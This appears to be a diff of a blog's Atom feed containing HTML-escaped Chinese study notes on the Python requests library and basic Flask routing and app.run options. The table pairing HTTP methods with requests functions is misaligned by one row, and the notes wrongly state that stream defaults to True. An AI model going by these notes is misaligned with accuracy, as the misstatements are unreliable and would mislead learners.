+ delete 是小写，其他都是大写&lt;br&gt;
+ **kwargs:(可选)&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;params: 字典或字节序列，作为参数增加到 url 中。&lt;/li&gt;
+&lt;li&gt;data：字典，字节寻猎或文件对象，作为 requests 的内容。&lt;/li&gt;
+&lt;li&gt;Json: JSON 格式的数据。作为 request 的内容。&lt;/li&gt;
+&lt;li&gt;Header: 字典，HTTP 定制头。&lt;br&gt;
+以上要掌握。&lt;/li&gt;
+&lt;li&gt;Cookies：字典或 CookieJar，Request 中的 cookie。&lt;/li&gt;
+&lt;li&gt;auth：元组，支持 HTTP 认证功能。&lt;/li&gt;
+&lt;li&gt;Files：字典类型，传输文件。&lt;/li&gt;
+&lt;li&gt;Timeout: 设定超时时间，秒为单位。&lt;/li&gt;
+&lt;li&gt;Proxies：字典类型，设定访问代理服务器，可以增加登录认证。&lt;br&gt;
+其他高级选项：&lt;/li&gt;
+&lt;li&gt;allow_redirects: True/False, 默认为 True，重定义开关。&lt;/li&gt;
+&lt;li&gt;Stream: True/False, 默认为 True，获取内容立即下载开关。&lt;/li&gt;
+&lt;li&gt;Verify：True/False，默认为 True，认证 SSL 证书开关。&lt;/li&gt;
+&lt;li&gt;cert：本地 SSL 证书路径。&lt;br&gt;
+（2）requests.post()：&lt;br&gt;
+函数原型：requests.post (url,data=None,json=None,**kwargs)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;HTTP 协议对资源的操作：&lt;br&gt;
+方法	               说明&lt;br&gt;
+ GET	请求获取 URL 位置的资源&lt;br&gt;
+ HEAD	请求获取 URL 位置资源的响应消息报告，即获得该资源的头部信息&lt;br&gt;
+ POST 	请求向 URL 位置的资源后附加新的数据&lt;br&gt;
+ PUT	请求向 URL 位置存储一个资源，覆盖原 URL 位置的资源&lt;br&gt;
+ PATCH	请求局部更新 URL 位置的资源，即改变该处资源的部分内容&lt;br&gt;
+ DELETE	请求删除 URL 位置存储的资源&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;           HTTP协议方法	      Requests库方法	      功能一致性
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;GET	requests.request ()	一致&lt;br&gt;
+ HEAD	requests.get ()	一致&lt;br&gt;
+ POST 	requests.head ()	一致&lt;br&gt;
+ PUT	requests.post ()	一致&lt;br&gt;
+ PATCH	requests.put ()	一致&lt;br&gt;
+ DELETE	requests.patch ()	一致&lt;/p&gt;
+&lt;p&gt;爬取网页的通用代码框架：&lt;br&gt;
+try:&lt;br&gt;
+r=requests.get(url,timeout=30)&lt;br&gt;
+r.raise_for_status()&lt;br&gt;
+r.encoding=r.apparent_encoding&lt;br&gt;
+return r.text&lt;br&gt;
+except:&lt;br&gt;
+return “产生异常”&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;                        Python flask框架
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;基本的框架：（创建了一个网页，写着 Hello World）&lt;br&gt;
+from flask import Flask&lt;br&gt;
+app = Flask(&lt;strong&gt;name&lt;/strong&gt;)&lt;/p&gt;
+&lt;p&gt;@app.route(’/’)&lt;br&gt;
+def hello_world():&lt;br&gt;
+return ‘Hello World’&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == ‘&lt;strong&gt;main&lt;/strong&gt;’:&lt;br&gt;
+app.run()&lt;/p&gt;
+&lt;p&gt;可以于 html 一起使用。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;approuterule-optionsrule-参数表示与该函数的url绑定-approutehellodef-hello_worldreturn-hello-worldurl-hello规则绑定到hello_world函数-因此如果用户访问httplocalhost5000hello-urlhello_world函数的输出将在浏览器中呈现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#approuterule-optionsrule-参数表示与该函数的url绑定-approutehellodef-hello_worldreturn-hello-worldurl-hello规则绑定到hello_world函数-因此如果用户访问httplocalhost5000hello-urlhello_world函数的输出将在浏览器中呈现&#34;&gt;#&lt;/a&gt; app.route(rule, options)&lt;br&gt;
+ rule 参数表示与该函数的 URL 绑定。&lt;br&gt;
+@app.route(’/hello’)&lt;br&gt;
+def hello_world():&lt;br&gt;
+return ‘hello world’&lt;br&gt;
+URL’/hello’规则绑定到 hello_world () 函数。&lt;br&gt;
+因此，如果用户访问 http://localhost:5000/hello URL，&lt;br&gt;
+hello_world () 函数的输出将在浏览器中呈现。&lt;/h2&gt;
+&lt;p&gt;options 是要转发给基础 Rule 对象的参数列表。&lt;br&gt;
+在上面的示例中，’/ ’ URL 与 hello_world () 函数绑定。因此，当在浏览器中打开 web 服务器的主页时，将呈现该函数的输出。&lt;br&gt;
+最后，Flask 类的 run () 方法在本地开发服务器上运行应用程序。&lt;/p&gt;
+&lt;p&gt;app.run(host, port, debug, options)&lt;br&gt;
+ host：要监听的主机名。 默认为 127.0.0.1（localhost）。设置为 “0.0.0.0” 以使服务器在外部可用&lt;br&gt;
+ port ：默认值为 5000&lt;br&gt;
+debug：默认为 false。 如果设置为 true，则提供调试信息，可以自动重载代码并显示调试信息&lt;br&gt;
+ options：要转发到底层的 Werkzeug 服务器。&lt;br&gt;
+Flask 变量规则&lt;br&gt;
+ #!/usr/bin/python&lt;/p&gt;
+&lt;h1 id=&#34;-coding-utf-8-&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#-coding-utf-8-&#34;&gt;#&lt;/a&gt; -&lt;em&gt;- coding: UTF-8 -&lt;/em&gt;-&lt;/h1&gt;
+&lt;p&gt;“”&amp;quot;&lt;br&gt;
+@author:chenshifeng&lt;br&gt;
+@file:flask_demo.py&lt;br&gt;
+@time:2021/03/01&lt;br&gt;
+“”&amp;quot;&lt;br&gt;
+from flask import Flask&lt;/p&gt;
+&lt;p&gt;app = Flask(&lt;strong&gt;name&lt;/strong&gt;)&lt;/p&gt;
+&lt;p&gt;@app.route(’/hello/&lt;name&gt;’)&lt;br&gt;
+def hello_name(name):&lt;br&gt;
+return ‘Hello %s!’ % name&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == ‘&lt;strong&gt;main&lt;/strong&gt;’:&lt;br&gt;
+app.run(debug=True)&lt;/p&gt;
+</content>
+        <category term="python" />
+        <updated>2024-01-24T01:42:39.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2023/12/17/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
